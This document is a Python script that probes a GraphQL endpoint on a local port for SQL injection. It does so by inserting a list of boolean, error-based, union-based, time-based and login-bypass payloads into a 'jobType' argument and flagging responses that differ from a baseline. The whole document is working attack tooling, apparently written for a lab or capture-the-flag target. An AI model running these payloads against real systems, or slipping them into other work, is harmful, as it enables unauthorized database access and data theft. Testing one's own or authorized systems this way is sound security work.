import requests
import json
import urllib.parse

# Target GraphQL endpoint
base_url = "http://127.0.0.1:33106"
graphql_endpoint = f"{base_url}/graphql"  # Common GraphQL endpoint path

# Headers for GraphQL requests
headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
}

# SQL Injection payloads to test
sql_payloads = [
    # Classic boolean-based
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1--",
    "' OR 1=1#",
    
    # Error-based
    "'",
    '"',
    "'",
    '"',
    
    # Union-based
    "' UNION SELECT 1,2,3,4--",
    "' UNION SELECT null,null,null,null--",
    "' UNION SELECT @@version,database(),user(),4--",
    
    # Time-based (if blind)
    "' OR SLEEP(5)--",
    "' OR 1=1 AND SLEEP(5)--",
    
    # Bypass attempts
    "' OR 1=1-- -",
    "' OR '1'='1'/*",
    "admin'--",
    "admin' #",
    "admin'/*"
]

print("[*] Starting GraphQL SQL Injection testing")
print(f"[*] Target endpoint: {graphql_endpoint}")
print(f"[*] Injection parameter: jobType")
print("=" * 60)

# Baseline request to see normal behavior
baseline_query = '{ jobs(jobType: "engineer") { id name type description } }'
try:
    response = requests.post(
        graphql_endpoint,
        headers=headers,
        json={"query": baseline_query},
        timeout=10
    )
    baseline_len = len(response.text)
    baseline_status = response.status_code
    print(f"[+] Baseline request (jobType: 'engineer')")
    print(f"[+] Status: {baseline_status} | Length: {baseline_len}B")
    print(f"[+] Response: {response.text[:200]}")
    print("=" * 60)
except Exception as e:
    print(f"[-] Baseline request failed: {e}")
    baseline_len = 0
    baseline_status = 0

# Test each SQL payload
for i, payload in enumerate(sql_payloads, 1):
    print(f"\n[{i}] Testing payload: {payload}")
    
    # Build GraphQL query with the payload
    # Need to properly escape the payload for JSON and GraphQL
    graphql_query = f'{{ jobs(jobType: "{payload}") {{ id name type description }} }}'
    
    try:
        response = requests.post(
            graphql_endpoint,
            headers=headers,
            json={"query": graphql_query},
            timeout=10
        )
        
        response_len = len(response.text)
        status_code = response.status_code
        
        # Print response details
        print(f"[+] Status: {status_code} | Length: {response_len}B")
        print(f"[+] Response: {response.text}")
        
        # Check for anomalies compared to baseline
        if status_code != baseline_status or abs(response_len - baseline_len) > 50:
            print(f"[!] ANOMALY DETECTED for payload: {payload}")
            print(f"[!] Different behavior from baseline - potential SQL injection!")
            
    except Exception as e:
        print(f"[-] Request failed: {e}")
    
    print("-" * 50)

print("\n[*] SQL Injection testing completed")

